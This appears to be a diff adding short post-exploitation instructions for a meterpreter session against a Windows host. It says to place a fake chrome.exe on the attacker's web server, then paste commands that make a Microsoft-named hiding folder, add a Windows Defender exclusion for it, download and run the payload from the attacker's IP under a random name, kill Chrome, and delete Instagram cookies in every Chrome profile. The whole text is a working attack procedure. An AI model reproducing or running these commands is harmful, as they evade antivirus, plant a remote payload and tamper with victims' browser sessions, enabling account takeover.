@@ -1,0 +1,5 @@
+1) copy chrome.exe file to %systemdrive%\inetpub\wwwroot\chrome.exe
+2) edit and copy this commands to meterpreter shell :
+
+set my_ip=192.168.70.18& set website_name=instagram.com& set rand_app_name=%random%
+md "%programdata%\regid.1574-03.com.microsoft" >nul 2>&1 & powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%programdata%\regid.1574-03.com.microsoft" & %systemdrive% & cd "%programdata%\regid.1574-03.com.microsoft" & powershell -command "Invoke-WebRequest -URI 'http://%my_ip%/chrome.exe' -OutFile '%programdata%\regid.1574-03.com.microsoft\regid.%rand_app_name%.exe'" & taskkill /f /im chrome.exe & for /f "delims=:" %a in ('dir /b "%localappdata%\Google\Chrome\User Data" ^| findstr /b /l "Profile"') do (regid.%rand_app_name%.exe /CookiesFile '%localappdata%\Google\Chrome\User Data\Default\network\cookies' /DeleteCookies ".%website_name%" & regid.%rand_app_name%.exe /CookiesFile '%localappdata%\Google\Chrome\User Data\%a\Network\cookies' /DeleteCookies ".%website_name%")
